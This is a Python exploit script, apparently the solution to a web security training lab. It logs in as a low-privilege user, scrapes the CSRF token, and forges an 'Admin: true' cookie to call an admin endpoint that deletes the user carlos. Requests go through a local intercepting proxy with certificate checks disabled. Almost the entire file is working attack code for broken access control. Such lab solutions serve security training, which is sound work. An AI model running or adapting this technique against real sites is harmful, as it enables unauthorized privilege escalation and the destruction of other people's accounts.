import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def delete_user(s, url):

    # get CSRF token from the login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #login as the wiener user
    data = {"csrf": csrf_token,
    "username": "wiener",
    "password": "peter"}

    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user.")

        # NOTE - Made a small change to fix retrieving the session cookie
        my_account_url = url + "/my-account"
        r = s.get(my_account_url, verify=False, proxies=proxies)
        session_cookie = s.cookies.get_dict().get('session')

        # Visit the admin panel and delete the user carlos
        delete_carlos_user_url = url + "/admin/delete?username=carlos"
        cookies = {'Admin': 'true', 'session': session_cookie}
        r = requests.get(delete_carlos_user_url, cookies=cookies, verify=False, proxies=proxies)
        if r.status_code == 200:
            print('(+) Successfully deleted Carlos user.')
        else:
            print('(-) Failed to delete Carlos user.')
            sys.exit(-1)
    else:
        print("(-) Failed to login as the wiener user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)

if __name__ == "__main__":
    main()
